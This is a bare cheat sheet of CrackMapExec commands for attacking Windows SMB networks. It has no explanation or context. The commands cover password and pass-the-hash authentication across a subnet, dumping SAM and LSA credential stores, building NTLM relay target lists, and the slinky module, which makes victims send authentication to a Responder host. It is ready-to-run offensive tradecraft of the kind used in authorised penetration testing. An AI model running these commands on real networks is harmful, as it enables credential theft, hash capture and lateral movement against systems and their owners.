crackmapexec

~~~bash
crackmapexec smb 10.0.0.0/24 -u username -d domain -p Password
~~~

~~~bash
crackmapexec smb 10.0.0.0/24 -u username -H hash --local-auth
~~~

~~~bash
crackmapexec smb <target ip> -u Guest -p “” -M slinky -o server=responder_ip name=some_unique_name
~~~

~~~bash
crackmapexec smb <CIDR> --gen-relay-list targets.txt
~~~

~~~bash
crackmapexec smb targets.txt -u Administrator -H <NT Hash> --local-auth
~~~

~~~bash
crackmapexec smb targets.txt -u Administrator -H <NT Hash> --local-auth --sam
~~~

~~~bash
crackmapexec smb targets.txt -u Administrator -H <NT Hash> --local-auth --lsa
~~~

~~~bash
crackmapexec smb ../scans/nmap-grep-[date]/smb-hosts.txt --gen-relay-list cme_relay.txt | tee cme.out
~~~